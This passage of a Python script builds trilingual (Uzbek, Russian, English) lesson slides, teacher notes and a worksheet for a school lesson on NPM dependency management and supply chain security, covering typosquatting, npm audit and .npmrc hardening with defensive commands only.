        <p style="font-size:11px; color:var(--ink-secondary);" data-ru="A) dependencies | B) devDependencies | C) global" data-en="A) dependencies | B) devDependencies | C) global">A) dependencies | B) devDependencies | C) global</p>
        <div style="margin-top:6px; font-weight:700; color:var(--success); font-size:11px;" data-ru="Ответ: B (devDependencies — инструмент разработчика)" data-en="Answer: B (devDependencies — developer-only tooling)">Javob: B (devDependencies — faqat ishlab chiquvchi vositasi)</div>
      </div>
      <div class="card" style="padding:14px;">
        <span class="badge" style="background:var(--danger); color:#fff;">4</span>
        <strong style="font-size:12px; display:block; margin:6px 0;" data-ru="Как называется атака с регистрацией пакета со схожим именем (например, mongooose)?" data-en="What is the attack vector of registering misspelled clones like 'mongooose'?">Mashhur paket nomini 1 ta harfga o'zgartirib soxta paket yaratish qanday ataladi?</strong>
        <p style="font-size:11px; color:var(--ink-secondary);" data-ru="A) Phishing | B) Typosquatting | C) Man-in-the-Middle" data-en="A) Phishing | B) Typosquatting | C) Man-in-the-Middle">A) Phishing | B) Typosquatting | C) Man-in-the-Middle</p>
        <div style="margin-top:6px; font-weight:700; color:var(--success); font-size:11px;" data-ru="Ответ: B (Typosquatting — охота на опечатки)" data-en="Answer: B (Typosquatting — adashib xato yozishni poylash)">Javob: B (Typosquatting — xato harf bosilishini poylash)</div>
      </div>
    </div>
  </section>

  <!-- SLIDE 10: VULNERABILITY AUDITING (NPM AUDIT) -->
  <section class="slide" data-phase="Amaliyot|Практика|Practice" data-time="50:00–56:00" data-slide-index="9">
    <div class="eyebrow"><span class="t" data-ru="АУДИТ УЯЗВИМОСТЕЙ · АВТОМАТИЧЕСКИЙ СКАНЕР" data-en="VULNERABILITY AUDITING · AUTOMATED SCANNER">ZAIFLIKLAR AUDITI · AVTOMATIK SKANER</span></div>
    <h2 data-ru="Аудит Безопасности: Команды npm audit и npm audit fix" data-en="Vulnerability Scanning: npm audit & npm audit fix">Xavfsizlik Auditi: npm audit va npm audit fix Buyruqlari</h2>
    <div class="grid-2">
      <div class="card">
        <h3 data-ru="Как работает сканер npm audit" data-en="How npm audit Works">npm audit Mexanizmi</h3>
        <p data-ru="NPM сравнивает установленные версии в lockfile с глобальной базой уязвимостей GitHub Advisory Database и выводит классификацию CVE:" data-en="NPM inspects your lockfile graph against the GitHub Advisory Database, categorizing CVE vulnerabilities:">NPM o'rnatilgan paketlarni GitHub Advisory Database global xavflar bazasi bilan solishtiradi va CVE darajasini ko'rsatadi:</p>
        <ul style="font-size:12px; line-height:1.7; margin-top:8px;">
          <li data-ru="🟢 <strong>Low:</strong> незначительные баги, DoS при редких условиях." data-en="🟢 <strong>Low:</strong> minor bugs, resource limits under obscure edge cases.">🟢 <strong>Low:</strong> kichik xatoliklar, kam uchraydigan chekka holatlar.</li>
          <li data-ru="🟡 <strong>Moderate:</strong> утечка второстепенных данных или медленный DoS." data-en="🟡 <strong>Moderate:</strong> secondary data leaks or performance degradations.">🟡 <strong>Moderate:</strong> ikkinchi darajali ma'lumotlar sizishi.</li>
          <li data-ru="🟠 <strong>High:</strong> обход авторизации или подделка токенов." data-en="🟠 <strong>High:</strong> privilege escalation or token tampering.">🟠 <strong>High:</strong> autentifikatsiyani chetlab o'tish xavfi.</li>
          <li data-ru="🔴 <strong>Critical:</strong> удаленное выполнение произвольного кода (RCE)!" data-en="🔴 <strong>Critical:</strong> Remote Code Execution (RCE) without auth!">🔴 <strong>Critical:</strong> masofadan turib yovuz kodni bajarish (RCE)!</li>
        </ul>
      </div>
      <div class="card">
        <h3 data-ru="Автоматическое исправление (Patching)" data-en="Automated Remediation">Zaifliklarni Yamoqlash</h3>
        <div class="code-block" style="font-size:11.5px; line-height:1.5;">
<span style="color:#64748b;"># 1. Zaifliklar ro'yxatini ko'rish</span>
npm audit

<span style="color:#22c55e;"># 2. Xavfsiz PATCH va MINOR yangilanishlarni kiritish</span>
npm audit fix

<span style="color:#ef4444;"># 3. MAJOR versiyani majburan yangilash (ehtiyot bo'ling!)</span>
npm audit fix --force
        </div>
        <p style="font-size:11px; margin-top:8px; color:var(--warning);" data-ru="Осторожно с флагом --force: он может повысить версию до ломающей обратную совместимость (MAJOR), и ваш сервер перестанет запускаться." data-en="Caution with --force: it aggressively bumps MAJOR dependencies, risking syntax breakage across your codebase.">Diqqat: --force bayrog'i MAJOR yangilanishlarni ham kiritgani sababli kodingizdagi funksiyalarni ishlamay qoldirishi mumkin.</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 11: ADVANCED DEFENSES (.NPMRC & SNYK) -->
  <section class="slide" data-phase="Himoya|Защита|Hardening" data-time="56:00–61:00" data-slide-index="10">
    <div class="eyebrow"><span class="t" data-ru="КОРПОРАТИВНАЯ ЗАЩИТА · ЭКСПЕРТНЫЙ УРОВЕНЬ" data-en="ENTERPRISE HARDENING · PRODUCTION LEVEL">KORPORATIV HIMOYALANISH · EXPERT DARAJASI</span></div>
    <h2 data-ru="Три Рубежа Защиты: .npmrc, Socket.dev и Линтеры" data-en="Three Rings of Defense: .npmrc, Socket.dev & Linters">Uch Bosqichli Kiber-Himoya: .npmrc, Socket.dev va Linterlar</h2>
    <div class="grid-3">
      <div class="card">
        <div class="tag" style="background:rgba(59,130,246,0.15); color:var(--accent);" data-ru="1. Файл Настроек" data-en="1. Config File">Loyiha .npmrc</div>
        <h3 data-ru="Жесткие Ограничения" data-en="Strict Policies">Qat'iy Cheklovlar</h3>
        <p data-ru="Создайте .npmrc в корне проекта: отключите скрипты и запретите установку без точного lockfile:" data-en="Place .npmrc in project root: disable script hooks and strictly require lockfiles:">Loyiha ildizida .npmrc yarating: skriptlarni taqiqlang va faqat qat'iy versiyalarni o'rnating:</p>
        <div class="code-block" style="font-size:10px; margin-top:6px;">
ignore-scripts=true
save-exact=true
package-lock=true
        </div>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(34,197,94,0.15); color:var(--success);" data-ru="2. Поведенческий Анализ" data-en="2. Behavior Engine">Socket.dev & Snyk</div>
        <h3 data-ru="Анализ Исходного Кода" data-en="Deep AST Scanning">AST Kod Tahlili</h3>
        <p data-ru="Сервисы вроде Socket.dev сканируют не только базу CVE, но и сам JS-код пакета на наличие eval(), обращения к сети и файловой системе." data-en="Tools like Socket.dev parse raw package AST to detect eval(), outbound telemetry, and disk accesses.">Paket ichidagi eval(), fayl o'qish yoki tarmoqqa sirli ulanishlarni o'rnatishdan oldin fosh qiluvchi neyrotahlil vositalari.</p>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(234,179,8,0.15); color:var(--warning);" data-ru="3. CI/CD Проверка" data-en="3. Pipeline Gate">GitHub Actions</div>
        <h3 data-ru="Авто-Блокировка PR" data-en="Automated PR Gate">Avtomatik PR Blokirovkasi</h3>
        <p data-ru="Настройте GitHub Actions, чтобы каждый Pull Request с уязвимостями выше Moderate автоматически отклонялся до релиза." data-en="Enforce CI/CD workflow blocking Pull Requests containing High/Critical CVEs before merge.">Har qanday Pull Request tekshiruvida High yoki Critical zaiflik aniqlansa, loyihaga qo'shilishini avtomatik to'xtatish.</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 12: HANDS-ON ARENA (STUDIO DEMO) -->
  <section class="slide" data-phase="Amaliyot|Практика|Practice" data-time="61:00–71:00" data-slide-index="11">
    <div class="eyebrow"><span class="t" data-ru="ПРАКТИЧЕСКИЙ ТЕРМИНАЛ · NPM SECURITY STUDIO" data-en="HANDS-ON LAB · NPM SECURITY STUDIO">AMALIY ARENA · NPM SECURITY STUDIO</span></div>
    <h2 data-ru="Лаборатория: Аудит Проекта и Обезвреживание Троянов" data-en="Hands-on Lab: Project Auditing & Neutralizing Trojans">Laboratoriya: Loyiha Auditi va Troyanlarni Zararsizlantirish</h2>
    <div class="hero-split">
      <div class="card">
        <div class="tag" style="background:rgba(59,130,246,0.15); color:var(--accent);" data-ru="Сценарий Миссии" data-en="Mission Scenario">Kiber-Missiya Topshirig'i</div>
        <h3 data-ru="Очистка Взломанного Проекта" data-en="Disinfecting Infiltrated Repo">Zararlangan Loyihani Tozalash</h3>
        <p data-ru="Вы получили репозиторий интернет-магазина. В файле package.json обнаружен подозрительный пакет 'crossenv' и устаревшая библиотека с Critical RCE уязвимостью. Ваша задача — провести полный аудит и сформировать чистый package-lock.json." data-en="You inherited an e-commerce codebase with typosquatted 'crossenv' and a critical RCE vulnerability. Run deep audits, neutralize hooks, and generate a pristine lockfile.">Sizga internet-do'kon loyihasi berildi. Unda shubhali 'crossenv' troyani va Critical RCE xavfiga ega eski kutubxona mavjud. Sizning vazifangiz — to'liq audit o'tkazish va toza package-lock.json shakllantirish.</p>
        <div class="box" style="margin-top:12px;">
          <strong data-ru="Шаги выполнения в симуляторе:" data-en="Simulator Action Steps:">Simulyatordagi amallar:</strong>
          <ul style="font-size:12px; line-height:1.6; margin-top:4px;">
            <li data-ru="1. Запустить <code>npm audit</code> и обнаружить 2 критические угрозы." data-en="1. Execute <code>npm audit</code> to expose 2 critical threats.">1. <code>npm audit</code> buyrug'ini berib, 2 ta xavfli tahdidni aniqlash.</li>
            <li data-ru="2. Удалить троян <code>npm uninstall crossenv</code> и установить оригинал." data-en="2. Remove trojan <code>npm uninstall crossenv</code> and pin original.">2. Troyanni o'chirish: <code>npm uninstall crossenv</code> va haqiqiy paketni qo'yish.</li>
            <li data-ru="3. Запустить <code>npm audit fix</code> для безопасного обновления версий." data-en="3. Run <code>npm audit fix</code> to safely patch libraries.">3. <code>npm audit fix</code> orqali xavfsiz yangilanishlarni kiritish.</li>
          </ul>
        </div>
      </div>
      <div class="card" style="display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; background:rgba(15,23,42,0.6);">
        <div style="font-size:42px; margin-bottom:10px;">📦 🛡️ 💻</div>
        <h3 data-ru="Запуск NPM Security Studio" data-en="Launch NPM Security Studio">NPM Kiber-Terminal</h3>
        <p style="font-size:13px; max-width:320px; color:var(--ink-secondary);" data-ru="Откройте папку studio/index.html для интерактивного терминала симуляции аудита." data-en="Open studio/index.html for interactive command-line terminal vulnerability simulations.">Interaktiv terminalda buyruqlarni berish va loyihani xavfsiz holatga keltirish uchun studiyani oching.</p>
        <a href="studio/index.html" target="_blank" style="display:inline-block; margin-top:14px; padding:10px 20px; border-radius:10px; background:var(--accent); color:#fff; text-decoration:none; font-weight:700; font-size:13px;" data-ru="🚀 Открыть NPM Studio" data-en="🚀 Open NPM Studio">🚀 NPM Studiyani Ochish</a>
      </div>
    </div>
  </section>

  <!-- SLIDE 13: PEER-REVIEW & STUDENT SHOWCASE -->
  <section class="slide" data-phase="Taqdimot|Демо|Showcase" data-time="71:00–76:00" data-slide-index="12">
    <div class="eyebrow"><span class="t" data-ru="ВЗАИМНАЯ ПРОВЕРКА · ДЕМОНСТРАЦИЯ РЕЗУЛЬТАТОВ" data-en="PEER REVIEW · STUDENT DEMOS">O'QUVCHILAR DEMOSI VA PEER-REVIEW</span></div>
    <h2 data-ru="Взаимный Аудит: Проверь package.json Одноклассника" data-en="Peer Audit: Inspecting Teammate's package.json">Juftlikda Tekshiruv: Partadoshingizning Loyihasini Audit Qiling</h2>
    <div class="grid-2">
      <div class="card">
        <div class="tag" style="background:rgba(34,197,94,0.15); color:var(--success);" data-ru="Роль: Аудитор Безопасности" data-en="Role: Security Auditor">Kiber-Auditor Vazifasi</div>
        <h3 data-ru="Чек-лист Инспекции (5 минут)" data-en="Audit Checklist (5 mins)">5 Daqiqalik Nazorat Ro'yxati</h3>
        <ul style="font-size:12px; line-height:1.7; margin-top:8px;">
          <li data-ru="[ ] Присутствует ли файл <code>package-lock.json</code> в репозитории?" data-en="[ ] Does the repository include a committed <code>package-lock.json</code>?">[ ] Loyihada <code>package-lock.json</code> fayli mavjudmi?</li>
          <li data-ru="[ ] Все ли тестовые утилиты (Jest, Nodemon) перенесены в <code>devDependencies</code>?" data-en="[ ] Are all dev utilities (Jest, Nodemon) categorized under <code>devDependencies</code>?">[ ] Test va linterlar <code>devDependencies</code> ga ajratilganmi?</li>
          <li data-ru="[ ] Нет ли подозрительных пакетов с опечатками (Typosquatting)?" data-en="[ ] Are dependency names free from typosquatted clones?">[ ] Shubhali 1 harf xatosi bor paketlar (Typosquatting) yo'qmi?</li>
          <li data-ru="[ ] Результат <code>npm audit</code> показывает 0 уязвимостей?" data-en="[ ] Does <code>npm audit</code> return zero vulnerabilities?">[ ] <code>npm audit</code> natijasi 0 ta zaiflikni ko'rsatmoqdami?</li>
        </ul>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(59,130,246,0.15); color:var(--accent);" data-ru="Демо на Смартборде" data-en="Smartboard Demo">Smartboard Demosi</div>
        <h3 data-ru="Разбор Чистого Отчета" data-en="Clean Audit Showcase">Haqiqiy Kiber-Hisobot</h3>
        <p data-ru="Два ученика выводят свой терминал на экран смартборда и демонстрируют, как команда npm audit fix успешно устранила все CVE уязвимости без повреждения зависимостей." data-en="Two students project their terminals to demonstrate how npm audit fix eliminated all CVE risks while keeping dependencies intact.">2 nafar o'quvchi o'z terminalini katta doskaga chiqaradi va qanday qilib npm audit fix yordamida barcha CVE xavflarini bartaraf etganini ko'rsatib beradi.</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 14: SUMMARY & 3-TIER HOMEWORK -->
  <section class="slide" data-phase="Xulosa|Итоги|Summary" data-time="76:00–80:00" data-slide-index="13">
    <div class="eyebrow"><span class="t" data-ru="ИТОГИ УРОКА И ДОМАШНЕЕ ЗАДАНИЕ · 10 БАЛЛОВ" data-en="LESSON SUMMARY & 3-TIER HOMEWORK · 10 POINTS">XULOSA VA 3 DARAJALI UY VAZIFASI · 10 BALL</span></div>
    <h2 data-ru="Итоги Урока и Домашнее Задание" data-en="Summary & 3-Tier Homework">Xulosa va 3 Darajali Uy Vazifasi</h2>
    <div class="grid-3">
      <div class="card">
        <div class="tag" style="background:rgba(59,130,246,0.15); color:var(--accent);" data-ru="Уровень 1: База (4 балла)" data-en="Tier 1: Core (4 pts)">1-Daraja: Baza (4 ball)</div>
        <h3 data-ru="Анализ SemVer и Манифеста" data-en="SemVer & Manifest Setup">package.json va SemVer</h3>
        <p data-ru="Создать package.json с правильным разделением dependencies и devDependencies, зафиксировав точные версии без karetki (^)." data-en="Build package.json properly splitting dependencies from devDependencies, fixing exact versions without ^ ranges.">dependencies va devDependencies to'g'ri ajratilgan package.json yaratish, barcha paketlarga karetkasiz (^) qat'iy versiyalarni yozish.</p>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(34,197,94,0.15); color:var(--success);" data-ru="Уровень 2: Инженерия (4 балла)" data-en="Tier 2: Engineering (4 pts)">2-Daraja: Muhandislik (4 ball)</div>
        <h3 data-ru="Аудит и Настройка .npmrc" data-en="Audit & .npmrc Hardening">Auditorlik va .npmrc</h3>
        <p data-ru="Написать файл конфигурации .npmrc с флагом ignore-scripts=true и провести аудит через npm audit, приложив отчет об исправлении 0 уязвимостей." data-en="Configure .npmrc with ignore-scripts=true, run npm audit, and attach clean 0-vulnerability audit logs.">ignore-scripts=true ko'rsatilgan .npmrc faylini sozlash va npm audit orqali barcha zaifliklarni bartaraf etib, toza hisobot chiqarish.</p>
      </div>
      <div class="card">
        <div class="tag" style="background:rgba(239,68,68,0.15); color:var(--danger);" data-ru="Уровень 3: Челлендж (2 балла)" data-en="Tier 3: Challenge (2 pts)">3-Daraja: Kiber-Challenge (2 ball)</div>
        <h3 data-ru="Детектор Typosquatting" data-en="Typosquatting Linter">Typosquatting Skaneri</h3>
        <p data-ru="Написать скрипт на JS (check-deps.js), который сравнивает список пакетов в package.json с базой популярных имен и вычисляет расстояние Левенштейна." data-en="Code a JS script (check-deps.js) checking package names against popular packages via Levenshtein distance to flag typosquatting clones.">package.json dagi paket nomlarini mashhur kutubxonalar bilan Levenshteyn masofasi orqali solishtirib, Typosquatting troyanlarini fosh qiluvchi skript yozish.</p>
      </div>
    </div>
    <div class="box" style="margin-top:14px; text-align:center;">
      <p style="font-size:13px;" data-ru="💡 Практическое домашнее задание доступно в файле vazifa.html с интерактивной проверкой и сохранением в LocalStorage." data-en="💡 Interactive homework is bundled in vazifa.html with client-side test runners and LocalStorage persistence.">💡 Interaktiv uy vazifasi <a href="vazifa.html" style="color:var(--accent); font-weight:700;">vazifa.html</a> faylida joylashgan bo'lib, avtomatik testlar va LocalStorage saqlash tizimiga ega.</p>
    </div>
  </section>
"""

# -----------------------------------------------------------------------------
# 2. TEACHER NOTES JSON (Triplets: [title, say, do])
# -----------------------------------------------------------------------------
NOTES_DATA = {
  "uz": [
    ["Kirish va Maqsad", "Bugun JavaScript ekotizimining yuragi bo'lgan NPM paketlar boshqaruvi va ta'minot zanjiri kiberxavfsizligini o'rganamiz. Har bir tashqi paket kiber-tahdid bo'lishi mumkin.", "Doskaga 35-dars mavzusini yozing va slaydni oching."],
    ["Uy Vazifasi Tahlili", "O'tgan 34-darsda formalar va XSS tozalashni ko'rgan edik. replace('<', '') sodda usul ekanini va xakerlar uni oson chetlab o'tishini eslatamiz. Entity encoding yagona ishonchli usul.", "O'quvchilardan blitz savolga javob oling."],
    ["NPM Ekotizimi", "NPM dunyodagi eng katta ochiq kodlar ombori. Biz bitta paket o'rnatganimizda, node_modules ichiga o'nlab tranzitiv kutubxonalar kirib keladi.", "Doskada tranzitiv bog'liqliklar daraxtini chizib bering."],
    ["SemVer Standarti", "MAJOR, MINOR, PATCH farqlarini va karetka (^) bilan tilda (~) xavfini tushuntiring. Karetka yangi xatolarni avtomatik yuklab olishi mumkin.", "Doskaga versiya raqamlarini yozib, qaysi biri yangilanishini o'quvchilardan so'rang."],
    ["Lockfile Yaxlitligi", "package-lock.json nega muhim? U har bir paketning aniq SHA-512 hashini saqlaydi. Serverda faqat npm ci ishlatilishi shart.", "npm install va npm ci farqini doskada taqqoslang."],
    ["dependencies vs dev", "Production serverga ortiqcha test va build vositalari tushmasligi kerak. dependencies faqat runtime uchun, devDependencies esa ishlab chiquvchi uchun.", "Talabalarga npm install --save-dev va --production buyruqlarini ko'rsating."],
    ["Typosquatting Hujumi", "Xakerlar eng mashhur paket nomlarini bitta harf farqi bilan ro'yxatdan o'tkazishadi (masalan, cross-env o'rniga crossenv). O'quvchilarni hushyorlikka o'rgating.", "Haqiqiy crossenv xakerlik tarixini so'zlab bering."],
    ["Zararli Skriptlar", "postinstall skriptlari orqali kod hatto import qilinmasdan turib ishga tushishi mumkin. Himoya vositasi: --ignore-scripts va .npmrc sozlamasi.", "Slayddagi xavfli package.json misolini tahlil qiling."],
    ["Interaktiv Quiz", "4 ta tezkor savol orqali darsning birinchi yarmini mustahkamlaymiz. O'quvchilardan javoblarni faol so'rang.", "Har bir savol bo'yicha to'g'ri javobni oching va xatolarni tuzating."],
    ["Xavfsizlik Auditi", "npm audit vositasi lockfile-ni GitHub xavflar bazasi bilan solishtiradi. CVE darajalari: Low dan Critical gacha. npm audit fix bilan yamoqlashni ko'rsatamiz.", "Terminalda audit buyrug'ini ishga tushiring."],
    ["Korporativ Himoya", "Uch bosqichli qalqon: .npmrc sozlamalari, Socket.dev / Snyk tahlilchisi va GitHub Actions orqali avtomatik bloklash.", "Slayddagi uchta himoya ustunini tushuntiring."],
    ["Amaliy Laboratoriya", "Endi NPM Security Studio terminalini ochib, zararlangan loyihani tozalaymiz: crossenv ni olib tashlaymiz va audit o'tkazamiz.", "O'quvchilarga studio/index.html ni ochishni buyuring va jarayonni nazorat qiling."],
    ["Peer-Review va Demo", "O'quvchilar juftlikda bir-birlarining package.json fayllarini audit qilishadi. 2 nafar o'quvchi o'z toza hisobotini katta doskaga chiqaradi.", "Sinfda faol o'quvchilarni rag'batlantiring va hisobotlarini tekshiring."],
    ["Xulosa va Uy Vazifasi", "Bugun biz professional Node.js muhandisi bilishi shart bo'lgan ta'minot zanjiri xavfsizligini o'rgandik. 3 darajali vazifa vazifa.html da mavjud.", "Uy vazifasi talablarini tushuntirib, darsni yakunlang."]
  ],
  "ru": [
    ["Введение и Цель", "Сегодня мы погружаемся в анатомию менеджера пакетов NPM и безопасность цепочки поставок (Supply Chain Security). Внешние зависимости требуют жесткого аудита.", "Запишите тему 35-го урока на доске и откройте первый слайд."],
    ["Разбор Домашнего Задания", "Разбираем ошибки 34-го урока: наивный replace('<', '') легко обходится хакерами. HTML entity encoding — единственный надежный способ защиты от XSS.", "Примите ответы учеников на блиц-вопрос."],
    ["Экосистема NPM", "NPM — крупнейший реестр библиотек. При установке одного модуля в node_modules попадают десятки транзитивных зависимостей.", "Нарисуйте дерево транзитивных связей на доске."],
    ["Стандарт SemVer", "Объясните роли MAJOR, MINOR, PATCH и риски использования символа каретки (^). Каретка может скачать зараженную версию без вашего ведома.", "Разберите примеры версионирования вместе с классом."],
    ["Целостность Lockfile", "Зачем нужен package-lock.json? Он хранит SHA-512 хеш каждого архива. На production сервере строго обязательна команда npm ci.", "Сравните поведение npm install и npm ci."],
    ["dependencies vs dev", "Инструменты сборки и тесты не должны попадать на боевой сервер. Разделяем runtime и devDependencies для снижения площади атаки.", "Покажите флаг --production при развертывании."],
    ["Атака Typosquatting", "Злоумышленники создают пакеты-клоны с опечаткой в одну букву (crossenv вместо cross-env), воруя секреты из .env файлов.", "Расскажите реальный кейс кражи токенов через typosquatting."],
    ["Вредоносные Скрипты", "Хуки postinstall выполняют произвольный shell-код сразу при скачивании пакета. Защита — флаг --ignore-scripts и файл .npmrc.", "Проанализируйте пример вредоносного скрипта на слайде."],
    ["Интерактивный Квиз", "Закрепляем теорию первой половины урока с помощью 4 быстрых блиц-вопросов. Вовлекайте учеников в обсуждение.", "Откройте правильные ответы и разберите логику."],
    ["Аудит Уязвимостей", "Команда npm audit сверяет зависимости с GitHub Advisory Database по уровням CVE. Устранение уязвимостей через npm audit fix.", "Продемонстрируйте вывод аудита в терминале."],
    ["Корпоративная Защита", "Три рубежа безопасности: параметры .npmrc, статический анализ через Socket.dev / Snyk и автоматический CI/CD гейт.", "Поясните три столпа промышленной защиты."],
    ["Практическая Лаборатория", "Открываем NPM Security Studio: обезвреживаем троянский пакет crossenv, обновляем уязвимости и создаем чистый lockfile.", "Контролируйте выполнение лабораторной работы в studio/index.html."],
    ["Взаимная Проверка и Демо", "Ученики в парах инспектируют package.json друг друга по чек-листу. Двое выводят чистый отчет аудита на большой экран.", "Оцените результаты парной работы и наградите лучших."],
    ["Итоги и Задание", "Мы изучили стандарты защиты цепочки поставок. Домашнее задание на 10 баллов ждет вас в vazifa.html.", "Напомните дедлайн и критерии оценки."]
  ],
  "en": [
    ["Intro & Mission", "Today we master NPM dependency governance and software supply chain security. External modules are potential attack vectors requiring rigorous audits.", "Write lesson 35 topic on the board and display slide 1."],
    ["Homework Review", "Reviewing lesson 34: naive replace('<', '') is easily bypassed. HTML entity escaping is the only foolproof defense against XSS.", "Collect student answers to the 30-second blitz question."],
    ["NPM Ecosystem", "NPM is the world's largest package registry. Installing a single package introduces dozens of hidden transitive dependencies inside node_modules.", "Sketch a dependency tree on the board."],
    ["SemVer Standards", "Demystify MAJOR.MINOR.PATCH and the risks of caret (^) vs tilde (~). Carets allow silent installation of compromised patch releases.", "Work through version calculation examples on the board."],
    ["Lockfile Integrity", "Why package-lock.json is vital: it stores exact SHA-512 integrity hashes. Enforce npm ci exclusively on production servers.", "Contrast npm install against npm ci in detail."],
    ["dependencies vs dev", "Testing suites and compilers must never ship to production. Segregate runtime modules from devDependencies to minimize attack surfaces.", "Demonstrate npm install --save-dev and --omit=dev flags."],
    ["Typosquatting Attacks", "Attackers register packages mirroring popular names with single-letter typos (e.g. crossenv stealing .env tokens).", "Narrate historical cases of typosquatted trojans."],
    ["Malicious Hooks", "The danger of postinstall scripts executing arbitrary shell commands before import. Mitigate via --ignore-scripts and .npmrc configuration.", "Inspect malicious package.json snippets on the slide."],
    ["Interactive Quiz", "Reinforce core concepts with a 4-question blitz quiz. Engage the room actively.", "Reveal solutions and address lingering misconceptions."],
    ["Vulnerability Auditing", "npm audit checks dependencies against the GitHub Advisory Database across CVE severity tiers. Patching via npm audit fix.", "Demonstrate live audit execution in the terminal."],
    ["Enterprise Hardening", "The three rings of defense: strict .npmrc settings, Socket.dev / Snyk AST code inspection, and automated CI/CD pull request gates.", "Detail the three pillars of enterprise security."],
    ["Hands-on Lab", "Launch NPM Security Studio: identify and purge typosquatted crossenv, remediate vulnerabilities, and lock down dependencies.", "Guide students through studio/index.html."],
    ["Peer Review & Showcase", "Pairs review each other's package.json against the security checklist. Two students demo zero-vulnerability audit logs on the smartboard.", "Highlight top performers and validate audit evidence."],
    ["Summary & Homework", "We mastered enterprise supply chain security. The 3-tier homework is ready in vazifa.html for 10 total points.", "Summarize key rules and conclude the lesson."]
  ]
}

def build_presentation():
    tpl_path = os.path.join(REPO_ROOT, "assets", "TEMPLATE_PREZENTATSIYA.html")
    with open(tpl_path, "r", encoding="utf-8") as f:
        tpl = f.read()

    tpl = tpl.replace("<title>Taqdimot shabloni — Target Maktabi</title>", "<title>9-sinf: NPM Ekotizimi va Ta'minot Zanjiri Xavfsizligi</title>")
    tpl = re.sub(r'name="total-slides"\s+content="\d+"', 'name="total-slides" content="14"', tpl)
    tpl = re.sub(r'id="totalSlides">0</span>', 'id="totalSlides">14</span>', tpl)

    stage_regex = r'<div class="stage" id="stage">[\s\S]*?</div>\s*<!-- \.stage -->'
    new_stage = f'<div class="stage" id="stage">\n{SLIDES_HTML}\n  </div><!-- .stage -->'
    tpl = re.sub(stage_regex, lambda m: new_stage, tpl)

    notes_json = json.dumps(NOTES_DATA, ensure_ascii=False, indent=2)
    notes_regex = r'var NOTES\s*=\s*\{[\s\S]*?\};\s*// \.NOTES'
    tpl = re.sub(notes_regex, lambda m: f'var NOTES = {notes_json};\n// .NOTES', tpl)

    out_path = os.path.join(DEST_DIR, "prezentatsiya.html")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(tpl)
    print("  ✓ Created: prezentatsiya.html")

def build_worksheet():
    tpl_path = os.path.join(REPO_ROOT, "assets", "TEMPLATE_VARAQA.html")
    with open(tpl_path, "r", encoding="utf-8") as f:
        tpl = f.read()

    tpl = tpl.replace("<title>Amaliy Ish Varaqasi — Target Maktabi</title>", "<title>Ish Varaqasi: NPM Ekotizimi va Xavfsizlik Auditi — 9-sinf</title>")
    tpl = tpl.replace("1-AMALIY ISH VARAQASI", "35-AMALIY ISH VARAQASI")
    tpl = tpl.replace("Mavzu: Kirish va Vibecoding asoslari", "Mavzu: NPM Ekotizimi, Tashqi Paketlar va Ta'minot Zanjiri Xavfsizligi")

    worksheet_body = """
  <div class="mission-box">
    <div class="mission-title" data-ru="МИССИЯ УРОКА: ЗАЩИТА ЦЕПОЧКИ ПОСТАВОК NPM" data-en="LESSON MISSION: NPM SUPPLY CHAIN DEFENSE">DARSNING KIBER-MISSIYASI: NPM TA'MINOT ZANJIRI HIMOYASI</div>
    <p style="font-size:12px; margin-top:4px;" data-ru="Освоить синтаксис SemVer, понять критическую роль package-lock.json, выявить вредоносные атаки Typosquatting и научиться устранять уязвимости библиотек через команду npm audit fix." data-en="Master SemVer version syntax, understand the mission-critical role of package-lock.json, detect Typosquatting attacks, and remediate CVE risks using npm audit fix.">SemVer versiyalash qoidalarini o'rganish, package-lock.json faylining xavfsizlik rolini tushunish, Typosquatting hujumlarini fosh qilish hamda npm audit fix yordamida barcha CVE zaifliklarini bartaraf etish.</p>
  </div>

  <div class="task-card">
    <div class="task-header">
      <span class="task-num">1</span>
      <h3 data-ru="Анализ Версий SemVer: Диапазоны Обновлений (2 балла)" data-en="SemVer Version Analysis: Range Evaluation (2 pts)">SemVer Tahlili: Versiyalar Yangilanish Diapazoni (2 ball)</h3>
    </div>
    <p style="font-size:12px;" data-ru="Заполните таблицу: какую максимальную версию установит npm install при указанной строке в package.json?" data-en="Complete the table: what is the maximum version npm install will pull for each manifest entry?">Jadvalni to'ldiring: package.json dagi yozuv bo'yicha npm install qaysi eng yuqori versiyani o'rnatadi?</p>
    <table style="width:100%; border-collapse:collapse; margin-top:8px; font-size:11px;">
      <thead>
        <tr style="background:var(--card-bg, #f1f5f9);">
          <th style="border:1px solid #cbd5e1; padding:6px;" data-ru="Запись в package.json" data-en="Entry">package.json dagi yozuv</th>
          <th style="border:1px solid #cbd5e1; padding:6px;" data-ru="Смысл префикса" data-en="Meaning">Belgining ma'nosi</th>
          <th style="border:1px solid #cbd5e1; padding:6px;" data-ru="Максимально допустимая версия" data-en="Max Allowed">Maksimal ruxsat etilgan versiya</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td style="border:1px solid #cbd5e1; padding:6px;"><code>"express": "^4.18.2"</code></td>
          <td style="border:1px solid #cbd5e1; padding:6px;" data-ru="Любые MINOR и PATCH" data-en="Any MINOR & PATCH">MINOR va PATCH yangilanishlar</td>
          <td style="border:1px solid #cbd5e1; padding:6px; color:#64748b;" data-ru="4.99.9 (до 5.0.0)" data-en="4.99.9 (before 5.0.0)">________________________</td>
        </tr>
        <tr>
          <td style="border:1px solid #cbd5e1; padding:6px;"><code>"lodash": "~4.17.21"</code></td>
          <td style="border:1px solid #cbd5e1; padding:6px;" data-ru="Только PATCH" data-en="PATCH only">Faqat PATCH tuzatishlar</td>
          <td style="border:1px solid #cbd5e1; padding:6px; color:#64748b;" data-ru="4.17.99 (до 4.18.0)" data-en="4.17.99 (before 4.18.0)">________________________</td>
        </tr>
        <tr>
          <td style="border:1px solid #cbd5e1; padding:6px;"><code>"bcrypt": "5.1.0"</code></td>
          <td style="border:1px solid #cbd5e1; padding:6px;" data-ru="Точная фиксация" data-en="Exact pin">Qat'iy aniq fiksatsiya</td>
          <td style="border:1px solid #cbd5e1; padding:6px; color:#64748b;" data-ru="Только 5.1.0" data-en="Strictly 5.1.0">________________________</td>
        </tr>
      </tbody>
